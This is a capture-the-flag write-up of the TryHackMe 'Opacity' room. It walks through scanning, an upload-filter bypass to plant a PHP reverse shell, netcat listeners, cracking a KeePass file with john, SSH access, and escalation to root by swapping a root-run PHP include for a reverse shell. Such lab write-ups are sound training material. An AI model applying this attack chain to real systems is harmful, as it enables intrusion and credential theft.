---
title: "Opacity Writeup THM"
description: "My writeup of the TryHackMe room [Opacity](https://tryhackme.com/room/opacity)"
date: 2024-01-08
image: https://images.unsplash.com/photo-1596703720229-1f8fbb8daae5?q=80&w=2574&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
    - SMB
categories:
    - Room
    - Easy
---

I am going to start with a nmap scan:

```bash
nmap -sC -sV 10.10.163.225

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-05 09:11 EST
Nmap scan report for 10.10.163.225
Host is up (0.057s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
|_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2024-01-05T14:12:03
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
```

Now we know that it runs HTTP and SAMBA,

first let’s see what’s in the web page:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Opacity-writeup-THM/main/099e4dcc-8d66-4a36-8ebc-076e03053aef_Export-837ad346-3d23-4d4a-9c1e-e576658a205a/Opacity%200ac982ae7c05472f984b5712f3032562/Untitled.png)

We can see that there is a login page.

But there are other directories:

```bash
ffuf -u http://10.10.163.225/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.163.225/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6221ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6475ms]
cloud                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 57ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 2377ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 56ms]
:: Progress: [20469/20469] :: Job [1/1] :: 327 req/sec :: Duration: [0:00:46] :: Errors: 0 ::
```

The cloud one could let us upload a reverse shell:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Opacity-writeup-THM/main/099e4dcc-8d66-4a36-8ebc-076e03053aef_Export-837ad346-3d23-4d4a-9c1e-e576658a205a/Opacity%200ac982ae7c05472f984b5712f3032562/Untitled%201.png)

We need to start our listener with a revshell.php, and upload the php code like that to avoid the security measurements:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Opacity-writeup-THM/main/099e4dcc-8d66-4a36-8ebc-076e03053aef_Export-837ad346-3d23-4d4a-9c1e-e576658a205a/Opacity%200ac982ae7c05472f984b5712f3032562/Untitled%202.png)

So we got the shell:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.65.91] from (UNKNOWN) [10.10.163.225] 37874
Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 14:47:56 up 37 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

In the opt folder I found out a dataset.kdbx file which stores the keepass credentials.

I copied it in the / folder so I could download it from my machine.

This type of file can be cracked using john:

```bash
john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt Keepasshash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)
1g 0:00:00:04 DONE (2024-01-05 09:58) 0.2105g/s 185.2p/s 185.2c/s 185.2C/s chichi..david1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And now if we open the file with keepass we got the credentials!

```bash
ssh sysadmin@10.10.163.225

sysadmin@10.10.163.225's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 05 Jan 2024 03:03:45 PM UTC

  System load:  0.02              Processes:             125
  Usage of /:   57.1% of 8.87GB   Users logged in:       0
  Memory usage: 28%               IPv4 address for eth0: 10.10.163.225
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Feb 22 08:13:43 2023 from 10.0.2.15
sysadmin@opacity:~$
```

And we got the first flag.

From here we have a scripts folder, inside there is a file owned by root:

```bash
cat script.php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

We see that this script calls `lib/backup.inc.php` so what I have done is moving the original script out of the folder, and instead put mine which contains a reverse shell(I have used the pentestermonkey one)

So the next time that the main script runs, we should have a reverse shell:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.65.91] from (UNKNOWN) [10.10.163.225] 55346
Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 15:20:02 up  1:09,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sysadmin pts/0    10.11.65.91      15:03    1:05   0.08s  0.08s -bash
uid=0(root) gid=0(root) groups=0(root)
bash: cannot set terminal process group (2322): Inappropriate ioctl for device
bash: no job control in this shell
root@opacity:/# ls
```
